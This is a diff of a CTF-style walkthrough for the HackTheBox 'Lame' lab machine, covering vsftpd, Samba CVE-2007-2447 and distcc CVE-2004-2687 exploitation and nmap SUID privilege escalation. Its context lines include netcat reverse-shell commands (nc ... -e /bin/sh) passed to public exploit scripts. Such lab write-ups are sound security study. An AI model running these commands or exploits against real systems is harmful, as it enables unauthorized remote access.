@@ -1,4 +1,4 @@
-# <a href='https://www.hackthebox.eu/home/machines/profile/1' target="blank">HackTheBox Lame</a>
+# HackTheBox Lame
 
 > Author: Hades
 
@@ -8,7 +8,7 @@
 
 ## Information Gathering
 
-### Open Services
+### Openning Services
 
 To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port.
 
@@ -189,6 +189,8 @@ Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds
 
 ### vsftpd-2.3.4-exploit
 
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
+
 Base on `searchsploit`, we know the vsftpd 2.3.4 service had a critical vul allowing attacker to execute command in the server.
 
 ![](images/2.png)
@@ -212,6 +214,8 @@ nmap -p 6200 10.10.10.3 -Pn
 Because port 6200 is not open, then we don't have a backdoor in Lame server.
 
 ### CVE-2007-2447
+
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
 
 <a href='https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation' target="blank">Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution</a>. The payload execute command \` in the username.
 
@@ -238,6 +242,8 @@ python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh'
 	![](images/6.png)
 
 ### CVE-2004-2687
+
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
 
 Based on nmap script, I identify distcc-cve2004-2687 and search the public exploit <a href='https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855' target="blank">DistCC Daemon - Command Execution (Python)</a>
 
@@ -281,6 +287,8 @@ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 444
 ## Privilege Escalation
 
 ### Nmap SUID
+
+[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
 	
 Using [LinEnum.sh](https://github.com/rebootuser/LinEnum) to audit Lame server, I saw nmap had SUID.
 
